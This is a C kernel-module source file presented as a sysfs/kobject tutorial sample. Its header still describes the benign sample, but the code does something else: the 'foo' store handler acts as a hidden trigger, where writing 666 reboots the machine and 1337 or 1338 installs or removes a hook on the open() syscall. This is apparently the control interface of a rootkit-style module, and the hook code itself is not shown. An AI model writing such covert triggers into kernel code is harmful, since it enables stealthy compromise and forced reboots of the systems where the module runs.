/* 
 * How to use sysfs and kobjects.
 * Adapted from the samples/ directory of the kernel tree
 *
 * This makes a subdirectory in sysfs called /sys/kernel/DIRNAME.
 * In that directory, 3 files are created: "foo", "baz", and "bar".
 * If an integer is written to these files, it can be read out of it later.
 * However, each file changes its integer in its own way whenever we read it.
 */

#include <linux/module.h>	/* for THIS_MODULE macro */
#include <linux/kobject.h>
#include <linux/string.h>
#include <linux/sysfs.h>

#include <linux/reboot.h>	/* for doing retarded shit  :) 	*/
#include "toplel.h"		/* even more retarded shit  :) 	*/
#include "kapi.h"		/* for get_process_info() 	*/

#define DIRNAME			THIS_MODULE->name

static int foo;

static ssize_t foo_show(struct kobject *kobj, struct kobj_attribute *attr, char *buf)
{
	return sprintf(buf, "%u\n", foo);
}

static ssize_t foo_store(struct kobject *kobj, struct kobj_attribute *attr, const char *buf, size_t count)
{
	sscanf(buf, "%u", &foo);

	/* 666 reboots the machine
	 * 1337 hooks the open() syscall.
	 * 1338 uninstalls the hook */
	switch (foo) {
	case 666:	kernel_restart(NULL); 	break;
	case 1337:	toplel_insert(); 	break;
	case 1338:	toplel_remove(); 	break;
	}

	return count;
}

/* Sysfs attributes cannot be world-writable. */
static struct kobj_attribute foo_attribute = __ATTR(foo, 0664, foo_show, foo_store);

/* Create a group of attributes. Lets us create & destroy many at once */
static struct attribute *attrs[] = {
	&foo_attribute.attr,
	NULL,	/* needed to signal end of list */
};

/* If we add .name = "mydir", the files will go in 
 * DIRNAME/mydir, rather than DIRNAME */
static struct attribute_group attr_group = {
	.attrs = attrs,
};

static struct kobject *my_kobj;


/* Exported functions begin here */
extern int kobj_init(void)
{
	int ret;

	/* Create /sys/kernel/DIRNAME */
	my_kobj = kobject_create_and_add(DIRNAME, kernel_kobj);
	if (!my_kobj)
		return -ENOMEM;

	/* Create the files associated with this kobject */
	ret = sysfs_create_group(my_kobj, &attr_group);
	if (ret)
		kobject_put(my_kobj);

	return ret;
}

extern void kobj_kill(void)
{
	kobject_put(my_kobj);
}
